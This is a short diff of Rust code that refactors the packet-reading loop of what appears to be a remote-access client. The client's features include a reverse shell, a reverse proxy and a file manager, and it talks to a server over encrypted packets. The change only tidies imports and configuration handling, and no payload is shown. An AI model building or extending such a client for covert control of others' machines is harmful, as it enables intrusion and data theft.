@@ -8,10 +8,11 @@ use tokio::sync::oneshot;
 use tokio::sync::mpsc;
 use std::sync::Mutex;
 use once_cell::sync::Lazy;
-use crate::REVERSE_SHELL;
 use crate::features::file_manager::FileManager;
 use crate::features::reverse_proxy::ReverseProxy;
 use common::connection::{ConnectionReader, ConnectionWriter};
+use crate::service::config::get_config;
+use crate::REVERSE_SHELL;
 
 static PACKET_SENDER: Lazy<Mutex<Option<mpsc::Sender<ServerboundPacket>>>> = Lazy::new(|| {
     Mutex::new(None)
@@ -23,14 +24,14 @@ pub async fn reading_loop(
     secret: Option<Vec<u8>>,
     mut nonce_generator: Option<ChaCha20Rng>,
 ) {
-    let config = crate::service::config::get_config();
+    let config = get_config();
     let mut reverse_proxy = ReverseProxy::new();
     let mut file_manager = FileManager::new();
-    let mut reverse_shell_lock = crate::REVERSE_SHELL.lock().unwrap();
+    let mut reverse_shell_lock = REVERSE_SHELL.lock().unwrap();
     'l: loop {
         match reader.read_packet(&secret, nonce_generator.as_mut()).await {
             Ok(Some(ClientboundPacket::InitClient)) => {
-                let client_info = client_info();
+                let client_info = client_info(config.group.clone());
                 match send_packet(ServerboundPacket::ClientInfo(client_info.clone())).await {
                     Ok(_) => println!("Sent client info to server"),
                     Err(e) => {
